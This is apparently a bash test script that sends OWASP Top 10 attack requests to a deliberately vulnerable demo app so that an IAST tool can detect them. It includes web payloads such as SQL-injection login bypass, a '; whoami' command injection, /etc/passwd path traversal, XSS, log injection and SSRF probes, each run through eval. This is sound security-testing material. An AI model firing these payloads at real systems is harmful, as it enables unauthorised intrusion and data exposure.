#!/bin/bash

# Vulnerability Testing Script
# This script tests all OWASP Top 10 vulnerabilities in the demo application

BASE_URL="${1:-http://localhost:8080}"

echo "🧪 Testing Vulnerable Demo Application"
echo "🎯 Target: $BASE_URL"
echo "⚠️  WARNING: Only run this against the demo application in isolated environments!"
echo ""

# Colors for output
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
NC='\033[0m' # No Color

test_vulnerability() {
    local name=$1
    local command=$2
    
    echo -e "${YELLOW}Testing: $name${NC}"
    echo "Command: $command"
    eval $command
    echo ""
    echo "---"
    echo ""
}

echo "═══════════════════════════════════════════════════════"
echo "A01: BROKEN ACCESS CONTROL"
echo "═══════════════════════════════════════════════════════"

test_vulnerability "IDOR - View User Profile 1" \
    "curl -s '$BASE_URL/access-control/profile/1' | head -20"

test_vulnerability "IDOR - View User Profile 2" \
    "curl -s '$BASE_URL/access-control/profile/2' | head -20"

test_vulnerability "Missing Access Control - Delete User" \
    "curl -s -X POST '$BASE_URL/access-control/admin/delete-user/2'"

test_vulnerability "Path Traversal" \
    "curl -s '$BASE_URL/access-control/download?filename=/etc/passwd' | head -20"

echo "═══════════════════════════════════════════════════════"
echo "A02: CRYPTOGRAPHIC FAILURES"
echo "═══════════════════════════════════════════════════════"

test_vulnerability "Weak Hashing (MD5)" \
    "curl -s -X POST '$BASE_URL/crypto/hash-password' -d 'password=MyPassword123'"

test_vulnerability "Hardcoded Credentials" \
    "curl -s '$BASE_URL/crypto/get-api-key'"

test_vulnerability "Insecure Random Token" \
    "curl -s '$BASE_URL/crypto/generate-token'"

echo "═══════════════════════════════════════════════════════"
echo "A03: INJECTION"
echo "═══════════════════════════════════════════════════════"

test_vulnerability "SQL Injection - Authentication Bypass" \
    "curl -s -X POST '$BASE_URL/injection/sql' -d \"username=' OR '1'='1&password=' OR '1'='1\""

test_vulnerability "Command Injection" \
    "curl -s -X POST '$BASE_URL/injection/command' -d 'host=localhost; whoami'"

test_vulnerability "LDAP Injection" \
    "curl -s -X POST '$BASE_URL/injection/ldap' -d \"username=*)(uid=*))(|(uid=*\""

echo "═══════════════════════════════════════════════════════"
echo "A03: CROSS-SITE SCRIPTING (XSS)"
echo "═══════════════════════════════════════════════════════"

test_vulnerability "Reflected XSS" \
    "curl -s '$BASE_URL/xss/search?query=<script>alert(\"XSS\")</script>' | grep script"

test_vulnerability "Stored XSS (Comment)" \
    "curl -s -X POST '$BASE_URL/xss/comment' -d 'comment=<img src=x onerror=alert(1)>'"

echo "═══════════════════════════════════════════════════════"
echo "A05: SECURITY MISCONFIGURATION"
echo "═══════════════════════════════════════════════════════"

test_vulnerability "Verbose Error Messages" \
    "curl -s '$BASE_URL/config/error-test?input=notanumber'"

test_vulnerability "Debug Information Exposure" \
    "curl -s '$BASE_URL/config/debug'"

test_vulnerability "Default Credentials" \
    "curl -s '$BASE_URL/config/admin-panel?user=admin&pass=admin'"

echo "═══════════════════════════════════════════════════════"
echo "A07: AUTHENTICATION FAILURES"
echo "═══════════════════════════════════════════════════════"

test_vulnerability "No Rate Limiting - Multiple Login Attempts" \
    "for i in {1..5}; do curl -s -X POST '$BASE_URL/auth/login' -d 'username=admin&password=wrong'; done"

test_vulnerability "Weak Password Policy" \
    "curl -s -X POST '$BASE_URL/auth/register' -d 'username=test&password=123&email=test@example.com'"

test_vulnerability "Username Enumeration" \
    "curl -s -X POST '$BASE_URL/auth/check-username' -d 'username=admin'"

echo "═══════════════════════════════════════════════════════"
echo "A08: SOFTWARE AND DATA INTEGRITY FAILURES"
echo "═══════════════════════════════════════════════════════"

test_vulnerability "No Integrity Check - File Upload" \
    "curl -s -X POST '$BASE_URL/integrity/upload' -d 'filename=malicious.sh&content=#!/bin/bash\\necho hacked'"

echo "═══════════════════════════════════════════════════════"
echo "A09: SECURITY LOGGING AND MONITORING FAILURES"
echo "═══════════════════════════════════════════════════════"

test_vulnerability "Log Injection" \
    "curl -s -X POST '$BASE_URL/logging/login-attempt' -d \"username=admin%0ASUCCESS: Admin logged in&password=test\""

test_vulnerability "Sensitive Data in Logs" \
    "curl -s -X POST '$BASE_URL/logging/process-payment' -d 'cardNumber=4532123456789010&cvv=123&amount=100'"

echo "═══════════════════════════════════════════════════════"
echo "A10: SERVER-SIDE REQUEST FORGERY (SSRF)"
echo "═══════════════════════════════════════════════════════"

test_vulnerability "SSRF - Fetch Internal URL" \
    "curl -s -X POST '$BASE_URL/ssrf/fetch-url' -d 'url=http://localhost:8080/actuator/health'"

test_vulnerability "SSRF - Image Proxy" \
    "curl -s '$BASE_URL/ssrf/proxy-image?imageUrl=http://localhost:8080/actuator/env'"

test_vulnerability "XXE - XML External Entity" \
    "curl -s -X POST '$BASE_URL/ssrf/parse-xml' -d 'xmlContent=<?xml version=\"1.0\"?><root><test>data</test></root>'"

echo ""
echo -e "${GREEN}✅ Testing Complete!${NC}"
echo ""
echo "📊 Summary:"
echo "- All OWASP Top 10 categories tested"
echo "- Check your IAST tool dashboard for detected vulnerabilities"
echo "- Review application logs for injection attempts"
echo ""
echo -e "${RED}⚠️  Remember: This is an intentionally vulnerable application${NC}"
echo "   Only use in isolated testing environments!"
